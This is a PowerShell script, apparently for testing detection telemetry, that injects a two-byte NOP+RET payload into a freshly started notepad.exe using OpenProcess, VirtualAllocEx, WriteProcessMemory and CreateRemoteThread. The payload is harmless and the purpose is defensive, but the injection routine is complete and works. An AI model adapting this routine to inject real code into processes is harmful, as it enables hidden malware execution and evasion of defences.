# Benign remote-thread injection simulation for telemetry testing.
# Injects a tiny shellcode (NOP + ret) into a freshly started notepad.exe.
# Requires PowerShell running as the same user as the target process.

param(
    [int]$TargetPid = 0
)

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out int lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READ = 0x20;
}
"@

function Start-NotepadTarget {
    $proc = Start-Process -FilePath "notepad.exe" -PassThru
    Start-Sleep -Milliseconds 500
    return $proc.Id
}

if ($TargetPid -eq 0) {
    Write-Host "[injector] starting notepad.exe target"
    $TargetPid = Start-NotepadTarget
}

Write-Host "[injector] target PID: $TargetPid"

# Tiny benign shellcode: x64 NOP + RET
$shellcode = [byte[]]@(0x90, 0xC3)

$hProcess = [Injector]::OpenProcess([Injector]::PROCESS_ALL_ACCESS, $false, $TargetPid)
if ($hProcess -eq [IntPtr]::Zero) {
    throw "OpenProcess failed"
}

try {
    $addr = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$shellcode.Length, [Injector]::MEM_COMMIT -bor [Injector]::MEM_RESERVE, [Injector]::PAGE_EXECUTE_READ)
    if ($addr -eq [IntPtr]::Zero) {
        throw "VirtualAllocEx failed"
    }

    $written = [IntPtr]::Zero
    $ok = [Injector]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$shellcode.Length, [ref]$written)
    if (-not $ok) {
        throw "WriteProcessMemory failed"
    }

    $tid = 0
    $hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
    if ($hThread -eq [IntPtr]::Zero) {
        throw "CreateRemoteThread failed"
    }

    Write-Host "[injector] injected benign shellcode, remote thread id: $tid"
    [void][Injector]::CloseHandle($hThread)
}
finally {
    [void][Injector]::CloseHandle($hProcess)
}

Start-Sleep -Seconds 2
Write-Host "[injector] stopping notepad.exe"
Stop-Process -Id $TargetPid -Force -ErrorAction SilentlyContinue
Write-Host "[injector] done"
